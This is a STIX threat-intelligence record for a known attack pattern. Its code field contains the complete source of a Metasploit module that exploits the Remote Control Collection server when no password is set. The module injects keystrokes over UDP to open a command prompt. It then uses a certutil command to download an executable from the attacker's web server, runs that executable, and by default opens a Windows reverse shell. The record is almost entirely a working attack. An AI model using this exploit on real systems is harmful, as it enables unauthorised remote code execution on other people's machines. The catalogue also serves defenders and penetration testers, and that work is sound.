{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d728b7f8-e4cd-489b-aa6a-9206c0c9e390",
    "created": "2024-08-14T16:47:18.390326Z",
    "modified": "2024-08-14T16:47:18.390331Z",
    "name": "Remote Control Collection RCE",
    "description": " This module utilizes the Remote Control Server's, part of the Remote Control Collection by Steppschuh, protocol to deploy a payload and run it from the server.  This module will only deploy a payload if the server is set without a password (default). Tested against 3.1.1.12, current at the time of module writing  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/remote_control_collection_rce.rb",
            "external_id": "remote_control_collection_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "http://remote-control-collection.com"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/remote%20control%20collection/remote-control-collection-rce.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Exploit::Remote::Udp\n  include Exploit::EXE # generate_payload_exe\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Remote Control Collection RCE',\n        'Description' => %q{\n          This module utilizes the Remote Control Server's, part\n          of the Remote Control Collection by Steppschuh, protocol\n          to deploy a payload and run it from the server.  This module will only deploy\n          a payload if the server is set without a password (default).\n          Tested against 3.1.1.12, current at the time of module writing\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'H4rk3nz0' # edb, discovery\n        ],\n        'References' => [\n          [ 'URL', 'http://remote-control-collection.com' ],\n          [ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/remote%20control%20collection/remote-control-collection-rce.py' ]\n        ],\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Platform' => 'win',\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          ['default', {}],\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/shell/reverse_tcp',\n          'WfsDelay' => 5,\n          'Autocheck' => false\n        },\n        'DisclosureDate' => '2022-09-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]\n        }\n      )\n    )\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'Port Remote Mouse runs on', 1926]),\n        OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),\n        OptString.new('PATH', [true, 'Where to stage payload for pull method', '%temp%\\\\']),\n        OptString.new('CLIENTNAME', [false, 'Name of client, this shows up in the logs', '']),\n      ]\n    )\n  end\n\n  def path\n    return datastore['PATH'] if datastore['PATH'].end_with? '\\\\'\n\n    \"#{datastore['PATH']}\\\\\"\n  end\n\n  def special_key_header\n    \"\\x7f\\x15\\x02\"\n  end\n\n  def key_header\n    \"\\x7f\\x15\\x01\"\n  end\n\n  def windows_key\n    udp_sock.put(\"#{special_key_header}\\x01\\x00\\x00\\x00\\xab\") # key up\n    udp_sock.put(\"#{special_key_header}\\x00\\x00\\x00\\x00\\xab\") # key down\n    sleep(datastore['SLEEP'])\n  end\n\n  def enter_key\n    udp_sock.put(\"#{special_key_header}\\x01\\x00\\x00\\x00\\x42\")\n    sleep(datastore['SLEEP'])\n  end\n\n  def send_command(command)\n    command.each_char do |c|\n      udp_sock.put(\"#{key_header}#{c}\")\n      sleep(datastore['SLEEP'] / 10)\n    end\n    enter_key\n    sleep(datastore['SLEEP'])\n  end\n\n  def check\n    @check_run = true\n    @check_success = false\n    upload_file\n    return Exploit::CheckCode::Vulnerable if @check_success\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_request_uri(cli, _req)\n    @check_success = true\n    if @check_run # send a random file\n      p = Rex::Text.rand_text_alphanumeric(rand(8..17))\n    else\n      p = generate_payload_exe\n    end\n    send_response(cli, p)\n    print_good(\"Request received, sending #{p.length} bytes\")\n  end\n\n  def upload_file\n    connect_udp\n    # send a space character to skip any screensaver\n    udp_sock.put(\"#{key_header} \")\n    print_status('Connecting and Sending Windows key')\n    windows_key\n\n    print_status('Opening command prompt')\n    send_command('cmd.exe')\n\n    filename = Rex::Text.rand_text_alphanumeric(rand(8..17))\n    filename << '.exe' unless @check_run\n    if @service_started.nil?\n      print_status('Starting up our web service...')\n      start_service('Path' => '/')\n      @service_started = true\n    end\n    get_file = \"certutil.exe -urlcache -f http://#{srvhost_addr}:#{srvport}/ #{path}#{filename}\"\n    send_command(get_file)\n    if @check_run.nil? || @check_run == true\n      send_command(\"del #{path}#{filename} && exit\")\n    else\n      register_file_for_cleanup(\"#{path}#{filename}\")\n      print_status('Executing payload')\n      send_command(\"#{path}#{filename} && exit\")\n    end\n    disconnect_udp\n  end\n\n  def exploit\n    @check_run = false\n    upload_file\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-20",
    "x_mitre_platforms": [
        "win'"
    ]
}